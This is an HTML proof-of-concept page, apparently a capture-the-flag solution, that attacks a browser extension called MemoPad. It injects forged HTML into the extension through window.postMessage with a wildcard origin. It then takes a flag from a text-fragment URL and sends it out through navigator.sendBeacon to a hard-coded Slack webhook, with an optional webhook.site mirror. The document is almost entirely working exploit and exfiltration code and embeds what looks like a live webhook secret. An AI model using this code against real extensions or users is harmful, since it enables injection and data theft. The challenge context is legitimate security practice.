<!DOCTYPE html>
<meta charset="utf-8" />
<title>MemoPad Leak PoC</title>
<body style="font-family: system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial;line-height:1.45">
  <h1>MemoPad Leak PoC</h1>
  <p>Status: <span id="status">booting…</span></p>
  <p id="extHint" style="color:#b91c1c;display:none">⚠️ Extension content script not detected on this page. If your extension matches only <code>http://*/*</code>, host this page over <b>HTTP</b> (not HTTPS).</p>
  <hr>
  <details open>
    <summary>Payload being sent</summary>
    <pre id="payloadBox" style="white-space:pre-wrap"></pre>
  </details>
  <hr>
  <h2>Captured (preview)</h2>
  <pre id="captured">(nothing yet)</pre>
</body>
<script>
/*** 1) CONFIG — set your Slack webhook ***/
const SLACK_WEBHOOK = "https://hooks.slack.com/services/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";
/*** END CONFIG ***/

(function () {
  const statusEl = document.getElementById("status");
  const payloadBox = document.getElementById("payloadBox");
  const capturedEl = document.getElementById("captured");
  const extHint = document.getElementById("extHint");
  const qs = new URLSearchParams(location.search);
  const mirrorWebhook = qs.get("w"); // optional: ?w=https://webhook.site/<uuid>

  // Helper: check if extension content script injected (the bot also waits for this meta on target pages)
  function extInjected() {
    return !!document.querySelector('meta[memopad-extensionId]');
  }

  // 1) Robustly plant the malicious memo
  const attackerUrl = location.origin + location.pathname; // must match exactly (no query)
  const payload =
    "</div></div>" +
    '<div class="memo-item" data-index="0">' +
    '<a class="memo-url" href="' + attackerUrl + '">open</a>' +
    "</div>" +
    "<template>";
  payloadBox.textContent = payload;

  async function waitForExtAndPost(maxMs = 4000) {
    const t0 = performance.now();
    while (performance.now() - t0 < maxMs) {
      if (extInjected()) break;
      await new Promise(r => setTimeout(r, 150));
    }
    if (!extInjected()) {
      extHint.style.display = "";
      statusEl.textContent = "Extension not detected; posting anyway (may fail)…";
    } else {
      statusEl.textContent = "Extension detected; posting payload…";
    }
    // Post a few times (timing insurance)
    for (let i = 0; i < 3; i++) {
      try { window.postMessage({ type: "create", payload }, "*"); } catch {}
      await new Promise(r => setTimeout(r, 150));
    }
    statusEl.textContent = "payload posted; waiting for popup click…";
  }

  // 2) On revisit with #:~:text=<FLAG>, exfiltrate to Slack (+ optional mirror)
  function tryExtractAndSend() {
    const m = location.href.match(/#:~:text=(.*)$/);
    if (!m) return false;
    const flag = decodeURIComponent(m[1] || "");
    capturedEl.textContent = flag || "(empty)";
    statusEl.textContent = "flag captured; sending…";

    const text = `:triangular_flag_on_post: *CTF Flag*\n\`${flag}\`\nfrom <${location.href}|attacker.html>`;
    const bodyJson = JSON.stringify({ text });

    // Slack via sendBeacon with proper content-type
    try {
      const blob = new Blob([bodyJson], { type: "application/json" });
      navigator.sendBeacon && navigator.sendBeacon(SLACK_WEBHOOK, blob);
    } catch {}

    // Optional mirror (GET) — great for debugging
    if (mirrorWebhook) {
      try { (new Image()).src = mirrorWebhook + "?flag=" + encodeURIComponent(flag) + "&u=" + encodeURIComponent(location.href) + "&ts=" + Date.now(); } catch {}
    }

    statusEl.textContent = "sent (check Slack / webhook)";
    return true;
  }

  // Fire both paths
  waitForExtAndPost();
  if (!tryExtractAndSend()) setTimeout(tryExtractAndSend, 700);
})();
</script>
